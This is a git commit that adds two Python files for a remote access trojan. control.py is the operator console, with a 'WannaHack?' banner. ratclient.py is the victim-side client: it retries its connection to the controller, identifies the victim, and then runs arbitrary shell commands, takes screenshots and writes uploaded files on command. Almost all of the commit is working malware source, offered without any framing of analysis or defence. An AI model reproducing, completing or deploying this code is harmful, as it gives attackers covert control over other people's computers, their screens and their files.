4de569c22efe7806542cf1dddd2aa95f466812d0
sane800r41 <163453304+sane800r41@users.noreply.github.com>
2024-04-15 09:10:24 +0200

    First @Foliowiec contrib. Welcome :)
    :100:

---
+++ control.py
@@ -0,0 +1,67 @@
+import base64
+import ctypes
+import datetime
+import getpass
+import os
+import socket
+import art
+from colorama import Fore
+import ast
+
+PORT = 55555
+IP = "localhost"
+FULLADDRESS = (IP, PORT)
+
+ENCODING = 'utf-8'
+HEADER = 1000000
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(FULLADDRESS)
+
+client.send(f"{getpass.getuser()}@adminconsole".encode())
+
+print(Fore.RED + art.text2art("WannaHack?"))
+
+
+
+
+def send(message):
+    message = base64.b64encode(message)
+    chunks = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
+    client.send(str(len(chunks)).encode())
+    for message in chunks:
+        client.send(message)
+
+while True:
+    command = input(Fore.LIGHTWHITE_EX + "\n > " + Fore.GREEN)
+    if len(command) > 0:
+        args = command.split(" ")
+        if args[0] == "screenshot":
+            send(command.encode())
+            chunks = client.recv(HEADER).decode()
+            chunksout = ""
+            for i in range(int(chunks)):
+                chunksout += client.recv(HEADER).decode()
+
+            with open('screenshot.png','wb') as ss:
+                ss.write(base64.b64decode(chunksout.strip('][').split(', ')[0]))
+                ss.close()
+        else:
+            if args[0] == "upload" and len(args) > 1:
+                bs = '\\'
+                if len(args) > 1 and os.path.exists(args[1]):
+                    with open(args[1],'rb+') as file:
+                        filebytes = file.read()
+                        file.close()
+                send(f"upload {os.path.normpath(args[1]).split(bs)[-1]}|{base64.b64encode(filebytes)}".encode())
+            else:
+                send(command.encode())
+            chunks = client.recv(HEADER).decode()
+            chunksout = ""
+            for i in range(int(chunks)):
+                chunksout += client.recv(HEADER).decode()
+            chunksout = ast.literal_eval(chunksout)
+            for chunk in chunksout:
+                decoded = base64.b64decode(chunk).decode(errors="ignore")
+                print(Fore.RESET + decoded)
+
---
+++ ratclient.py
@@ -0,0 +1,120 @@
+import ast
+import getpass
+import os
+import socket
+import subprocess
+import time
+from colorama import Fore
+import base64
+from threading import Thread
+import pyautogui
+
+PORT = 55555
+IP = "localhost"
+FULLADDRESS = (IP, PORT)
+
+HEADER = 1000000
+
+us3rn4me = getpass.getuser()
+c1d = -1
+v1ctimid = us3rn4me.lower()
+pcname = socket.gethostname()
+fullname = f"{us3rn4me}@{pcname}"
+
+USERDIR = os.getenv("USERPROFILE")
+APPDATA = os.getenv("APPDATA")
+LOCAL = os.getenv("LOCALAPPDATA")
+TEMP = os.getenv("TEMP")
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+while True:
+    try:
+        client.connect(FULLADDRESS)
+        break
+    except ConnectionRefusedError:
+        pass
+
+client.send(f"{fullname}%{v1ctimid}".encode())
+
+def unsplit(list):
+    value = ""
+    for s in list:
+        value += s + " "
+    return value
+
+def send(message):
+    message = base64.b64encode(message)
+    chunks = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
+    client.send(str(len(chunks)).encode())
+    for message in chunks:
+        client.send(message)
+
+while True:
+    command = ""
+    chunks = client.recv(HEADER).decode()
+    for i in range(int(chunks)):
+        command += client.recv(HEADER).decode()
+    command = base64.b64decode(command).decode()
+    args = command.split(" ")
+    print(args)
+    if c1d == v1ctimid:
+        if args[0] == "id":
+            send(f"{Fore.GREEN}[{fullname}]{Fore.RESET} {fullname}".encode())
+
+        elif args[0] == "cd":
+            if len(args) > 1:
+                try:
+                    os.chdir(args[1])
+                    send(f"{Fore.GREEN}[{fullname}] [*] Current working directory changed to {os.getcwd()}{Fore.RESET}".encode())
+                except OSError:
+                    send(f"{Fore.RED}[{fullname}] [!] Invalid path{Fore.RESET}".encode())
+            else:
+                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
+
+        elif args[0] == "pwd":
+            send(f"{Fore.GREEN}[{fullname}]{Fore.RESET} {os.getcwd()}".encode())
+        elif args[0] == "screenshot":
+            pyautogui.screenshot().save(TEMP+"\\ss.png")
+            with open(TEMP+"\\ss.png",'rb') as ss:
+                ssbytes = ss.read()
+                ss.close()
+                send(ssbytes)
+            os.remove(TEMP+"\\ss.png")
+
+        elif args[0] == "cmd":
+            os.getcwd()
+            if len(args) > 1:
+                out = subprocess.run(f"cd {os.getcwd()} & {unsplit(args[1:])}",shell=True,capture_output=True).stdout
+                send(out)
+
+            else:
+                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
+
+        elif args[0] == "upload":
+            print("File download")
+            filename = args[1].split("|")[0]
+            filebytes = args[1].split("|")[1]
+
+            with open(os.getcwd()+f"\\{filename}",'wb+') as file:
+                file.write(base64.b64decode(ast.literal_eval(filebytes)))
+                file.close()
+            send(f"{Fore.GREEN}[{fullname}] [*] File succesfully saved{Fore.RESET}".encode())
+
+        elif args[0] == "download":
+            if os.path.exists(args[1]):
+                send(f"{Fore.GREEN}[{fullname}] [*] Sending file!{Fore.RESET}".encode())
+        else:
+            send(f"{Fore.RED}[{fullname}] [!] No such command found{Fore.RESET}".encode())
+
+    else:
+        if args[0] == "control":
+            if len(args) > 1:
+                c1d = args[1]
+                if c1d == v1ctimid:
+                    send(f"{Fore.GREEN}[{fullname}] [*] You are currently controlling {v1ctimid}".encode())
+                else:
+                    send(f"{Fore.GREEN}[{fullname}] [*] Command executed{Fore.RESET}".encode())
+            else:
+                send(f"{Fore.RED}[{fullname}] [!] Invalid syntax{Fore.RESET}".encode())
+        else:
+            send(f"{Fore.RED}[{fullname}] [!] No such command found or you are not controlling a client{Fore.RESET}".encode())
